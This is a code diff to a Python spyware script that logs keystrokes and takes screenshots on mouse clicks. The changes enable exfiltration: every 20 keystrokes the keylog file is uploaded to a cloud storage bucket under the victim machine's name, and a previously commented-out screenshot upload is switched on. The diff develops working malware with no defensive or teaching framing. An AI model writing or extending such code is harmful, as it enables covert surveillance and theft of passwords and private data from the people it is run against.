@@ -31,7 +31,7 @@ imgPath = 'screenshot.jpg'
 
 
 def on_press(key):
-    global lastThreeKeys
+    global lastThreeKeys, f
     if len(lastThreeKeys) == 3:
         lastThreeKeys = lastThreeKeys[1:]
     lastThreeKeys.append(str(key))
@@ -47,6 +47,14 @@ def on_press(key):
             # delete screenshot.jpg + data.txt
             os._exit(1)
 
+        elif len(data) % 20 == 0:
+            f.close()
+
+            storage.child(os.environ['COMPUTERNAME'] +
+                          '/keylogs_' + today_date + '.txt') \
+                .put('data.txt')
+
+            f = open('data.txt', 'a+', encoding='utf-8')
         printKey(key)
     except:
         printKey(key)
@@ -115,15 +123,17 @@ def on_click(x, y, button, pressed):
         with mss.mss() as sct:
             sct.shot(output=imgPath)
 
+            # try to save bitmap instead, or some other small size format of pics
             image = Image.open(imgPath)
-            image.save(imgPath, quality=20, optimize=True)
+            image = image.resize((1000, 562), Image.ANTIALIAS)
+            image.save(imgPath, quality=50, optimize=True)
 
             full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
             today_date = full_currentTime.split(' ')[1]
 
-            '''storage.child(os.environ['COMPUTERNAME'] +
+            storage.child(os.environ['COMPUTERNAME'] +
                           '/screenshot_' + full_currentTime + '.jpg') \
-                .put(imgPath)'''
+                .put(imgPath)
 
 
 # Collect events of mouse clicks and keyboard keys
